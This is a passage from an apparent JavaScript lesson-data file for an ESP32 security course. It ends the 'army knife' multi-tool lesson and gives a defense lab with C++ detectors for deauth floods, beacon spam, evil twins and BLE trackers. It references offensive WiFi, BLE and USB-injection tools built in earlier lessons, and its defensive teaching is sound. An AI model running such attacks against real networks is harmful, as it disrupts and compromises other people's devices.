                tip: '<strong>Each module is self-contained.</strong> If you want to add a new tool (e.g., an RF spectrum analyzer, a packet logger), you create a new class that implements ToolModule and add it to the modules[] array. The main menu automatically shows it.'
            },
            {
                title: 'Settings Module',
                content: '<p>A settings page for device configuration: display brightness, scan intervals, USB mode selection, WiFi region, and a system info page showing firmware version and memory usage.</p>',
                code: 'class SettingsModule : public ToolModule {\npublic:\n    const char* name() override { return "Settings"; }\n    const char* description() override { return "Configure"; }\n    \n    struct Setting {\n        const char* label;\n        int value;\n        int minVal;\n        int maxVal;\n        int step;\n    };\n    \n    Setting settings[4] = {\n        {"Brightness", 128, 10, 255, 10},\n        {"Scan Interval", 10, 3, 60, 1},\n        {"USB Mode", 0, 0, 2, 1},  // 0=CDC, 1=HID, 2=MSC\n        {"WiFi Channel", 0, 0, 13, 1}  // 0=auto\n    };\n    int selectedSetting = 0;\n    \n    void init() override {}\n    \n    void run() override {}\n    \n    void draw() override {\n        tft.fillScreen(TFT_BLACK);\n        tft.setTextColor(TFT_CYAN, TFT_BLACK);\n        tft.setTextSize(2);\n        tft.setCursor(10, 5);\n        tft.println("SETTINGS");\n        tft.setTextSize(1);\n        \n        for (int i = 0; i < 4; i++) {\n            int y = 35 + i * 20;\n            tft.setCursor(10, y);\n            if (i == selectedSetting) {\n                tft.setTextColor(TFT_BLACK, TFT_CYAN);\n            } else {\n                tft.setTextColor(TFT_WHITE, TFT_BLACK);\n            }\n            tft.printf(" %-16s %d ", settings[i].label, settings[i].value);\n        }\n        \n        // System info\n        tft.setTextColor(0x8410, TFT_BLACK);\n        tft.setCursor(10, 120);\n        tft.printf("Free heap: %d bytes\\n", ESP.getFreeHeap());\n        tft.printf("PSRAM: %d bytes\\n", ESP.getFreePsram());\n        tft.printf("Firmware: SG-111 Arsenal v1.0\\n");\n        tft.printf("Chip: %s Rev %d\\n", ESP.getChipModel(), ESP.getChipRevision());\n    }\n    \n    void cleanup() override {}\n    \n    void onButton(int btn) override {\n        if (btn == 0) {\n            selectedSetting = (selectedSetting + 1) % 4;\n            draw();\n        }\n        if (btn == 14) {\n            settings[selectedSetting].value += settings[selectedSetting].step;\n            if (settings[selectedSetting].value > settings[selectedSetting].maxVal)\n                settings[selectedSetting].value = settings[selectedSetting].minVal;\n            \n            // Apply brightness immediately\n            if (selectedSetting == 0) {\n                ledcWrite(0, settings[0].value);  // LEDC channel 0\n            }\n            draw();\n        }\n    }\n};',
                language: 'C++',
                tip: null
            }
        ],

        testing: '<p>Verify the complete multi-tool:</p>' +
                 '<ul>' +
                 '<li><strong>Main menu:</strong> All 6 modules listed with names and descriptions.</li>' +
                 '<li><strong>Module switching:</strong> Launch WiFi scan, return to menu, launch BLE scan. No crashes, no resource leaks.</li>' +
                 '<li><strong>Status bar:</strong> Shows current USB mode and WiFi status correctly.</li>' +
                 '<li><strong>Settings:</strong> Brightness slider works immediately. Other settings persist during the session.</li>' +
                 '<li><strong>Memory:</strong> Check free heap in Settings after running each module. Heap should recover after cleanup().</li>' +
                 '</ul>',

        troubleshooting: '<ul>' +
                         '<li><strong>Crash when switching modules:</strong> The previous module did not release its resources. Check that cleanup() calls WiFi.mode(WIFI_OFF) or BLEDevice::deinit(). Add a 500ms delay between cleanup and init.</li>' +
                         '<li><strong>USB HID does not work after WiFi module:</strong> USB and WiFi share some internal resources on the S3. Reinitialize USB.begin() after switching from WiFi to USB HID mode.</li>' +
                         '<li><strong>Out of memory:</strong> Each module should not allocate large buffers. Use fixed-size arrays (like Network[64]) instead of dynamic allocation. Check PSRAM usage with ESP.getFreePsram().</li>' +
                         '<li><strong>Display corruption between modules:</strong> Call tft.fillScreen(TFT_BLACK) at the start of every draw() method to clear the previous module display.</li>' +
                         '</ul>',

        challenges: '<p><strong>Challenge 1: Persistent Settings</strong> &mdash; Save settings to SPIFFS so they persist across reboots. Load them in setup() and apply them before showing the menu.</p>' +
                    '<p><strong>Challenge 2: Add a New Module</strong> &mdash; Create a "Packet Logger" module that captures WiFi traffic in promiscuous mode and logs frame statistics to the display. Integrate it into the menu without modifying any existing module code.</p>' +
                    '<p><strong>Challenge 3: WiFi Remote Control</strong> &mdash; Add a WiFi AP mode that serves a web interface. Control the army knife from your phone browser &mdash; select modules, trigger payloads, view scan results. This turns the TFT into a status display while the phone becomes the control interface.</p>',

        stepVisuals: {},
        componentCallouts: { svg: '', components: [{ id: 't-display-s3', name: 'LILYGO T-Display-S3', purpose: 'Runs the custom multi-tool firmware combining all previous projects. Modular architecture allows adding and removing tools independently.', specs: ['6 integrated modules', 'Module hot-swap', 'Settings persistence', 'Status bar dashboard'] }] },
        commonMistakes: [
            { title: 'Not Implementing cleanup() Properly', correct: 'Every module must release ALL resources in cleanup(): WiFi radio off, BLE deinitialized, USB classes removed, timers stopped, callbacks unregistered.', incorrect: 'Leaving WiFi or BLE initialized when switching to a different module.', consequence: 'Resource conflicts. The BLE module cannot start because WiFi still owns the radio. The USB HID module cannot register because MSC is still active. The device appears to work but modules fail silently.' },
            { title: 'Allocating Memory Dynamically in Modules', correct: 'Use fixed-size static arrays for scan results, device lists, and buffers. Pre-allocate everything at compile time.', incorrect: 'Using malloc(), new, or String concatenation extensively inside module run() loops.', consequence: 'Heap fragmentation. After switching modules 5-10 times, the ESP32-S3 runs out of contiguous memory and crashes. This is the #1 cause of instability in multi-tool firmware.' },
            { title: 'Building Without Testing Each Module Independently', correct: 'Test each module as a standalone sketch first (SG-103 through SG-109). Only integrate into the army knife after each module works perfectly alone.', incorrect: 'Writing all modules directly in the army knife codebase without standalone testing.', consequence: 'When something breaks, you cannot tell if the bug is in the module code, the module interface, the resource management, or the menu system. Debugging becomes exponentially harder.' }
        ]
    },

    // ========================================================================
    // SG-112: Defense Lab — Detecting Every Attack You Built
    // ========================================================================
    'sg-112': {
        // Wokwi wave 2: NO SIM — T-Display-S3 unsupported + offensive USB/BLE/RF features not in Wokwi.
        simulator: { available: false, note: 'The defense lab detects and blocks real <strong>USB attack</strong> behavior at the host &mdash; it depends on actual USB device enumeration, which no browser simulator produces. Needs the physical setup.' },
        intro: '<p>The final project. You have spent SG-103 through SG-111 building offensive tools. Now you build the defense. Using a second ESP32 (standard DevKit or CYD from earlier projects), you will create a comprehensive threat detection dashboard that identifies every attack technique you learned.</p>' +
               '<p>The lesson: <strong>every attack has a signature, every signature has a detector.</strong> The tools you built are powerful because they are fast and automated. The detectors you build here are powerful because they understand the attack at the protocol level &mdash; because you wrote the attack code yourself.</p>' +
               '<p>This is the blue team capstone. Red builds the weapon. Blue builds the shield. The best security professionals can do both.</p>',

        wiring: '    Two devices required:\n\n    Device 1: T-Display-S3 (attacker/red team)\n        Running SG-111 Army Knife firmware\n\n    Device 2: ESP32 DevKit or CYD (defender/blue team)\n        Running this detection firmware\n        Connected to your network via WiFi\n\n    Both devices on the same 2.4GHz space.',

        wiringNotes: '<p><strong>Two devices required.</strong> The T-Display-S3 runs the red team tools (SG-111). A second ESP32 runs the blue team detection firmware (this project). They operate simultaneously to demonstrate attack and detection in real time.</p>' +
                     '<p><strong>Safety:</strong> Run both devices in an isolated environment. The red team device will generate WiFi and BLE traffic that could affect nearby networks. The blue team device is purely passive (receive-only).</p>',

        wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 400" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs>' +
            '<pattern id="sg112-grid" width="20" height="20" patternUnits="userSpaceOnUse"><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern>' +
            '<style>' +
            '@keyframes sg112-attack{0%{opacity:0;transform:translateX(-10px)}50%{opacity:1}100%{opacity:0;transform:translateX(10px)}}' +
            '@keyframes sg112-shield{0%,100%{stroke-width:1.5;stroke:rgba(34,197,94,0.5)}50%{stroke-width:3;stroke:rgba(34,197,94,1)}}' +
            '</style>' +
            '</defs>' +
            '<rect width="720" height="400" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="380" fill="url(#sg112-grid)" rx="4"/>' +
            '<text x="360" y="28" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">SG-112 DEFENSE LAB &#8212; RED vs BLUE</text>' +

            '<!-- RED TEAM: T-Display-S3 (left) -->' +
            '<rect x="30" y="50" width="220" height="200" rx="12" fill="#1e2736" stroke="#ef4444" stroke-width="2"/>' +
            '<rect x="30" y="50" width="220" height="28" rx="12" fill="rgba(239,68,68,0.15)"/>' +
            '<text x="140" y="69" text-anchor="middle" fill="#ef4444" font-size="11" font-weight="700">RED TEAM</text>' +
            '<text x="140" y="84" text-anchor="middle" fill="#fb923c" font-size="7">T-Display-S3 (SG-111 Army Knife)</text>' +
            '<!-- TFT -->' +
            '<rect x="42" y="95" width="82" height="110" rx="5" fill="#0a1628" stroke="#ef4444" stroke-width="1"/>' +
            '<text x="83" y="110" text-anchor="middle" fill="#ef4444" font-size="7" font-weight="600">ARMY KNIFE</text>' +
            '<text x="50" y="124" fill="#8b949e" font-size="5">WiFi Scanner</text>' +
            '<text x="50" y="136" fill="#8b949e" font-size="5">BLE Beacon</text>' +
            '<text x="50" y="148" fill="#8b949e" font-size="5">USB HID</text>' +
            '<text x="50" y="160" fill="#8b949e" font-size="5">Deauth (lab)</text>' +
            '<text x="50" y="174" fill="#ef4444" font-size="5">ATTACKING...</text>' +
            '<text x="50" y="196" fill="#555" font-size="5">SG-111 firmware</text>' +
            '<!-- Attack capabilities -->' +
            '<rect x="138" y="95" width="100" height="110" rx="4" fill="rgba(239,68,68,0.06)" stroke="rgba(239,68,68,0.15)" stroke-width="0.5"/>' +
            '<text x="188" y="110" text-anchor="middle" fill="#ef4444" font-size="7" font-weight="600">GENERATES</text>' +
            '<text x="148" y="126" fill="#8b949e" font-size="6">Deauth frames</text>' +
            '<text x="148" y="140" fill="#8b949e" font-size="6">Beacon spam</text>' +
            '<text x="148" y="154" fill="#8b949e" font-size="6">BLE flood</text>' +
            '<text x="148" y="168" fill="#8b949e" font-size="6">USB injection</text>' +
            '<text x="148" y="182" fill="#8b949e" font-size="6">Probe requests</text>' +
            '<text x="148" y="196" fill="#8b949e" font-size="6">Evil portal</text>' +
            '<!-- USB-C -->' +
            '<rect x="115" y="238" width="50" height="14" rx="4" fill="#333" stroke="#ef4444" stroke-width="1"/>' +
            '<text x="140" y="266" text-anchor="middle" fill="#8b949e" font-size="6">USB-C (power)</text>' +

            '<!-- RF waves between devices (animated) -->' +
            '<g transform="translate(290,145)">' +
            '<path d="M0,0 L130,0" stroke="#ef4444" stroke-width="1" stroke-dasharray="4,4" opacity="0.5"/>' +
            '<circle cx="30" cy="0" r="3" fill="#ef4444" style="animation:sg112-attack 1.5s ease-in-out infinite"/>' +
            '<circle cx="65" cy="0" r="3" fill="#ef4444" style="animation:sg112-attack 1.5s ease-in-out 0.5s infinite"/>' +
            '<circle cx="100" cy="0" r="3" fill="#ef4444" style="animation:sg112-attack 1.5s ease-in-out 1s infinite"/>' +
            '</g>' +
            '<text x="360" y="130" text-anchor="middle" fill="#ef4444" font-size="7">2.4GHz RF &#8594;</text>' +
            '<text x="360" y="172" text-anchor="middle" fill="#8b949e" font-size="6">Same airspace</text>' +

            '<!-- BLUE TEAM: ESP32 DevKit (right) -->' +
            '<rect x="470" y="50" width="220" height="200" rx="12" fill="#1e2736" stroke="#22c55e" stroke-width="2" style="animation:sg112-shield 3s ease-in-out infinite"/>' +
            '<rect x="470" y="50" width="220" height="28" rx="12" fill="rgba(34,197,94,0.15)"/>' +
            '<text x="580" y="69" text-anchor="middle" fill="#22c55e" font-size="11" font-weight="700">BLUE TEAM</text>' +
            '<text x="580" y="84" text-anchor="middle" fill="#4ade80" font-size="7">ESP32 DevKit or CYD (Detector)</text>' +
            '<!-- Detection domains -->' +
            '<rect x="482" y="95" width="196" height="30" rx="4" fill="rgba(34,197,94,0.08)" stroke="rgba(34,197,94,0.2)" stroke-width="0.5"/>' +
            '<text x="580" y="114" text-anchor="middle" fill="#22c55e" font-size="8" font-weight="600">THREAT DETECTION ENGINE</text>' +
            '<!-- Four detection domains -->' +
            '<rect x="482" y="132" width="92" height="28" rx="3" fill="rgba(59,130,246,0.08)" stroke="rgba(59,130,246,0.2)" stroke-width="0.5"/>' +
            '<text x="528" y="150" text-anchor="middle" fill="#60a5fa" font-size="7">WiFi Monitor</text>' +
            '<rect x="582" y="132" width="96" height="28" rx="3" fill="rgba(168,85,247,0.08)" stroke="rgba(168,85,247,0.2)" stroke-width="0.5"/>' +
            '<text x="630" y="150" text-anchor="middle" fill="#c084fc" font-size="7">BLE Monitor</text>' +
            '<rect x="482" y="166" width="92" height="28" rx="3" fill="rgba(239,68,68,0.08)" stroke="rgba(239,68,68,0.2)" stroke-width="0.5"/>' +
            '<text x="528" y="184" text-anchor="middle" fill="#ef4444" font-size="7">USB Monitor</text>' +
            '<rect x="582" y="166" width="96" height="28" rx="3" fill="rgba(234,179,8,0.08)" stroke="rgba(234,179,8,0.2)" stroke-width="0.5"/>' +
            '<text x="630" y="184" text-anchor="middle" fill="#eab308" font-size="7">NET Monitor</text>' +
            '<!-- Event log -->' +
            '<rect x="482" y="200" width="196" height="34" rx="3" fill="rgba(239,68,68,0.06)"/>' +
            '<text x="490" y="214" fill="#ef4444" font-size="6">!! DEAUTH: 12 frames/10s on Ch6</text>' +
            '<text x="490" y="226" fill="#eab308" font-size="6">!! BEACON SPAM: 35 new SSIDs</text>' +
            '<!-- USB-C -->' +
            '<rect x="555" y="238" width="50" height="14" rx="4" fill="#333" stroke="#22c55e" stroke-width="1"/>' +
            '<text x="580" y="266" text-anchor="middle" fill="#8b949e" font-size="6">USB-C (power)</text>' +

            '<!-- Lesson box (bottom center) -->' +
            '<rect x="180" y="280" width="360" height="80" rx="8" fill="rgba(168,85,247,0.06)" stroke="rgba(168,85,247,0.2)" stroke-width="0.5"/>' +
            '<text x="360" y="300" text-anchor="middle" fill="#c084fc" font-size="10" font-weight="700">EVERY ATTACK HAS A SIGNATURE</text>' +
            '<text x="360" y="318" text-anchor="middle" fill="#8b949e" font-size="7">Red team generates attacks &#8212; Blue team detects them in real time</text>' +
            '<text x="360" y="334" text-anchor="middle" fill="#8b949e" font-size="7">Detection without response is just awareness &#8212; add containment</text>' +
            '<text x="360" y="350" text-anchor="middle" fill="#22c55e" font-size="7">The best security professionals can do both</text>' +

            '<!-- Two-device requirement -->' +
            '<rect x="30" y="280" width="130" height="80" rx="6" fill="rgba(239,68,68,0.06)" stroke="rgba(239,68,68,0.2)" stroke-width="0.5"/>' +
            '<text x="95" y="300" text-anchor="middle" fill="#ef4444" font-size="8" font-weight="600">2 DEVICES</text>' +
            '<text x="40" y="318" fill="#8b949e" font-size="6">T-Display-S3</text>' +
            '<text x="40" y="332" fill="#8b949e" font-size="6">+ ESP32 DevKit</text>' +
            '<text x="40" y="346" fill="#8b949e" font-size="6">or CYD board</text>' +

            '<!-- Isolation warning -->' +
            '<rect x="560" y="280" width="130" height="80" rx="6" fill="rgba(234,179,8,0.06)" stroke="rgba(234,179,8,0.2)" stroke-width="0.5"/>' +
            '<text x="625" y="300" text-anchor="middle" fill="#eab308" font-size="8" font-weight="600">ISOLATED</text>' +
            '<text x="570" y="318" fill="#8b949e" font-size="6">Run both devices</text>' +
            '<text x="570" y="332" fill="#8b949e" font-size="6">in shielded lab</text>' +
            '<text x="570" y="346" fill="#8b949e" font-size="6">or Faraday cage</text>' +

            '</svg>' +
            '</div>',

        steps: [
            {
                title: 'Threat Detection Architecture',
                content: '<p>The detection system monitors four domains simultaneously: WiFi (management frames), BLE (advertisements), USB (new device events), and network (DNS/DHCP anomalies). Each domain has its own detection engine with configurable thresholds.</p>',
                code: '// Detection engine architecture\nstruct ThreatEvent {\n    unsigned long timestamp;\n    const char* domain;     // "WIFI", "BLE", "USB", "NET"\n    const char* type;       // "DEAUTH", "BEACON_SPAM", "TRACKER", etc.\n    int severity;           // 1=info, 2=warning, 3=critical\n    char details[128];\n};\n\nThreatEvent eventLog[50];\nint eventCount = 0;\n\n// Detection thresholds\nconst int DEAUTH_THRESHOLD = 5;      // frames per 10 seconds\nconst int BEACON_SPAM_THRESHOLD = 20; // new SSIDs per scan\nconst int BLE_SPAM_THRESHOLD = 50;    // advertisements per second\nconst int NEW_DEVICE_ALERT = 1;       // any new USB HID device\n\nvoid logThreat(const char* domain, const char* type, int severity, const char* details) {\n    if (eventCount >= 50) {\n        // Shift log (drop oldest)\n        memmove(eventLog, eventLog + 1, sizeof(ThreatEvent) * 49);\n        eventCount = 49;\n    }\n    ThreatEvent &e = eventLog[eventCount++];\n    e.timestamp = millis();\n    e.domain = domain;\n    e.type = type;\n    e.severity = severity;\n    strncpy(e.details, details, 127);\n}',
                language: 'C++',
                tip: '<strong>This is the same architecture used by enterprise SIEM systems.</strong> Events are logged with timestamp, domain, type, severity, and details. The difference is scale: a SIEM processes millions of events per second from thousands of sensors. Your ESP32 processes hundreds from its local radio.'
            },
            {
                title: 'WiFi Threat Detection',
                content: '<p>Monitor for deauth attacks (from SG-109), beacon spam (from SG-110/Marauder), rogue access points (new SSIDs matching known networks), and evil twin portals (duplicate SSIDs with different BSSIDs).</p>',
                code: '// WiFi threat detection (runs in promiscuous callback)\nvoid detectWiFiThreats() {\n    // 1. Deauth flood detection (from SG-109)\n    if (deauthCount > DEAUTH_THRESHOLD) {\n        char buf[128];\n        snprintf(buf, 128, "Deauth flood: %d frames, src: %02X:%02X:%02X:%02X:%02X:%02X",\n            deauthCount, lastAttackerMAC[0], lastAttackerMAC[1],\n            lastAttackerMAC[2], lastAttackerMAC[3],\n            lastAttackerMAC[4], lastAttackerMAC[5]);\n        logThreat("WIFI", "DEAUTH_FLOOD", 3, buf);\n    }\n    \n    // 2. Beacon spam detection\n    // Count SSIDs not in previous baseline\n    int newSSIDs = networkCount - baselineCount;\n    if (newSSIDs < 0) newSSIDs = 0;\n    if (newSSIDs > BEACON_SPAM_THRESHOLD) {\n        char buf[128];\n        snprintf(buf, 128, "Beacon spam: %d new SSIDs in last scan", newSSIDs);\n        logThreat("WIFI", "BEACON_SPAM", 2, buf);\n    }\n    \n    // 3. Evil twin detection (same SSID, different BSSID)\n    for (int i = 0; i < networkCount; i++) {\n        for (int j = i + 1; j < networkCount; j++) {\n            if (networks[i].ssid == networks[j].ssid &&\n                memcmp(networks[i].bssid, networks[j].bssid, 6) != 0) {\n                char buf[128];\n                snprintf(buf, 128, "Evil twin: SSID \\"%s\\" on 2 BSSIDs", networks[i].ssid.c_str());\n                logThreat("WIFI", "EVIL_TWIN", 3, buf);\n            }\n        }\n    }\n}',
                language: 'C++',
                tip: null
            },
            {
                title: 'BLE Threat Detection',
                content: '<p>Monitor for BLE beacon spam, unauthorized trackers, and suspicious device patterns.</p>',
                code: '// BLE threat detection\n// BLE globals (populated by BLE scan in separate task)\nextern int bleDeviceCount;\nextern BLEDeviceInfo bleDevices[];\n\nvoid detectBLEThreats() {\n    // 1. Tracker detection (from SG-106)\n    for (int i = 0; i < bleDeviceCount; i++) {\n        if (bleDevices[i].isTracker) {\n            char buf[128];\n            snprintf(buf, 128, "Tracker: %s RSSI:%d", \n                bleDevices[i].address.c_str(), bleDevices[i].rssi);\n            logThreat("BLE", "TRACKER", 2, buf);\n        }\n    }\n    \n    // 2. BLE spam detection (too many advertisements)\n    if (bleDeviceCount > BLE_SPAM_THRESHOLD) {\n        char buf[128];\n        snprintf(buf, 128, "BLE spam: %d devices in scan (normal: <20)", bleDeviceCount);\n        logThreat("BLE", "ADV_SPAM", 2, buf);\n    }\n    \n    // 3. Espressif OUI detection (possible assessment tool)\n    for (int i = 0; i < bleDeviceCount; i++) {\n        // Check for Espressif OUI: 24:6F:28, DC:54:75, etc.\n        if (bleDevices[i].address.startsWith("24:6F:28") ||\n            bleDevices[i].address.startsWith("DC:54:75")) {\n            char buf[128];\n            snprintf(buf, 128, "Espressif device: %s (possible pentest tool)",\n                bleDevices[i].address.c_str());\n            logThreat("BLE", "ESPRESSIF_OUI", 1, buf);\n        }\n    }\n}',
                language: 'C++',
                tip: null
            },
            {
                title: 'Threat Dashboard Display',
                content: '<p>The TFT shows a real-time threat dashboard with color-coded severity, event counts by domain, and a scrollable event log. Green = all clear. Yellow = warnings. Red = active attack detected.</p>',
                code: 'void drawThreatDashboard() {\n    tft.fillScreen(TFT_BLACK);\n    \n    // Overall status\n    int criticalCount = 0, warnCount = 0, infoCount = 0;\n    for (int i = 0; i < eventCount; i++) {\n        if (eventLog[i].severity == 3) criticalCount++;\n        else if (eventLog[i].severity == 2) warnCount++;\n        else infoCount++;\n    }\n    \n    // Status banner\n    uint16_t bannerColor = criticalCount > 0 ? TFT_RED : (warnCount > 0 ? TFT_YELLOW : TFT_GREEN);\n    tft.fillRect(0, 0, 320, 20, bannerColor);\n    tft.setTextColor(TFT_BLACK, bannerColor);\n    tft.setTextSize(1);\n    tft.setCursor(5, 6);\n    if (criticalCount > 0) {\n        tft.printf("THREAT DETECTED  Crit:%d Warn:%d", criticalCount, warnCount);\n    } else if (warnCount > 0) {\n        tft.printf("WARNINGS  Warn:%d Info:%d", warnCount, infoCount);\n    } else {\n        tft.printf("ALL CLEAR  Monitoring... Events:%d", eventCount);\n    }\n    \n    // Event log (most recent first)\n    int maxVisible = 8;\n    for (int i = eventCount - 1; i >= max(0, eventCount - maxVisible); i--) {\n        ThreatEvent &e = eventLog[i];\n        int row = (eventCount - 1 - i);\n        int y = 24 + row * 16;\n        \n        // Severity color\n        uint16_t color = e.severity == 3 ? TFT_RED : (e.severity == 2 ? TFT_YELLOW : 0x8410);\n        tft.setTextColor(color, TFT_BLACK);\n        tft.setCursor(5, y);\n        tft.printf("[%s] %s", e.domain, e.type);\n        \n        tft.setTextColor(0x8410, TFT_BLACK);\n        tft.setCursor(5, y + 8);\n        String detail = String(e.details);\n        if (detail.length() > 50) detail = detail.substring(0, 50) + "..";\n        tft.print(detail);\n    }\n}',
                language: 'C++',
                tip: '<strong>This dashboard is your SOC in a box.</strong> Red banner = active attack. Yellow = suspicious activity. Green = normal. The event log shows what happened, when, and what was detected. This is the same pattern used by SIEM dashboards in enterprise SOCs &mdash; just on a 1.9 inch screen.'
            }
        ],

        testing: '<p>Test with your SG-111 Army Knife as the red team:</p>' +
                 '<ul>' +
                 '<li><strong>WiFi scan detection:</strong> Run WiFi scan on the army knife. The detector should show an Espressif OUI info event (if MAC is not randomized).</li>' +
                 '<li><strong>Deauth detection:</strong> If testing deauth in a shielded lab, the detector should immediately show a CRITICAL deauth flood alert with the attacker MAC.</li>' +
                 '<li><strong>BLE tracker detection:</strong> Place an AirTag nearby. The detector should show a TRACKER warning.</li>' +
                 '<li><strong>Beacon spam detection:</strong> Run Marauder beacon spam. The detector should show a WARNING for excessive new SSIDs.</li>' +
                 '<li><strong>Dashboard colors:</strong> Verify green/yellow/red banner changes based on event severity.</li>' +
                 '</ul>',

        troubleshooting: '<ul>' +
                         '<li><strong>Detector does not see attacks:</strong> Make sure both devices are on the same 2.4GHz channel. The detector hops channels but may miss short bursts. Lock the detector to the attack channel for testing.</li>' +
                         '<li><strong>Too many false positives:</strong> Increase detection thresholds. In dense environments, 20+ SSIDs per scan is normal. Adjust BEACON_SPAM_THRESHOLD based on your environment baseline.</li>' +
                         '<li><strong>Event log fills too fast:</strong> Add deduplication &mdash; do not log the same event type more than once per 30 seconds. This prevents a single ongoing attack from flooding the log.</li>' +
                         '<li><strong>Display too small for event details:</strong> Add a detail view: tap/select an event to see full details on a separate screen. Return to dashboard with the BOOT button.</li>' +
                         '</ul>',

        challenges: '<p><strong>Challenge 1: Alert Webhook</strong> &mdash; When a CRITICAL event is logged, use the ESP32 WiFi (switching from promiscuous to STA mode) to send an HTTP POST to a webhook (Slack, Discord, or your own server). Real-time security alerting from a $4 device.</p>' +
                    '<p><strong>Challenge 2: PCAP Evidence</strong> &mdash; Log captured attack frames to an SD card in PCAP format. After an incident, the PCAP file can be opened in Wireshark for forensic analysis. Include the timestamp, attacker MAC, and raw frame bytes.</p>' +
                    '<p><strong>Challenge 3: Baseline Learning</strong> &mdash; Run the detector in "learning mode" for 24 hours. Record the normal environment: expected SSIDs, typical BLE device count, normal deauth rate. Then switch to "detection mode" and alert only on deviations from the baseline. This is how anomaly-based IDS systems work.</p>',

        stepVisuals: {},
        componentCallouts: { svg: '', components: [{ id: 'esp32-detector', name: 'ESP32 DevKit or CYD (Blue Team)', purpose: 'Runs the threat detection firmware in promiscuous mode. Monitors WiFi and BLE for attack signatures. Displays real-time threat dashboard.', specs: ['Promiscuous WiFi capture', 'BLE passive scan', 'Event logging', 'Color-coded dashboard'] }, { id: 't-display-s3', name: 'LILYGO T-Display-S3 (Red Team)', purpose: 'Runs the SG-111 Army Knife firmware as the adversary. Generates attacks that the blue team device detects.', specs: ['WiFi/BLE/USB tools', 'SG-111 firmware', 'Attack generation', 'Red team device'] }] },
        commonMistakes: [
            { title: 'Only Testing Detection Without Red Team Activity', correct: 'Run both devices simultaneously: the army knife generates attacks, the detector identifies them. Verify each detection rule fires when the corresponding attack runs.', incorrect: 'Only running the detector in a quiet environment and declaring it "works" because there are no alerts.', consequence: 'You have no evidence that the detector actually detects anything. A detector that has never been triggered might have bugs in its detection logic, wrong thresholds, or broken callbacks. Test with real attacks.' },
            { title: 'Trusting Detection as Prevention', correct: 'Detection tells you an attack is happening. Prevention requires separate action: enable PMF, disable USB ports, implement USB device policies, segment networks. Detection without response is just awareness.', incorrect: 'Assuming that because you can detect a deauth attack, your network is protected from it.', consequence: 'The attack continues while you watch the dashboard. Detection is step 1 of incident response. Without containment, eradication, and recovery steps, detection alone provides visibility without security.' },
            { title: 'Setting Thresholds Too Low in Dense Environments', correct: 'Baseline your environment first. In an apartment building, 30+ WiFi networks is normal. In a classroom, 50+ BLE devices is normal. Set thresholds above your baseline.', incorrect: 'Using the default thresholds (5 deauth frames, 20 SSIDs) in an environment where those numbers occur naturally.', consequence: 'Constant false alarms. The dashboard stays red permanently. Alert fatigue sets in and the operator ignores real threats because every alert is a false positive. This is the #1 cause of SIEM failure in enterprise SOCs.' }
        ]
    }

};
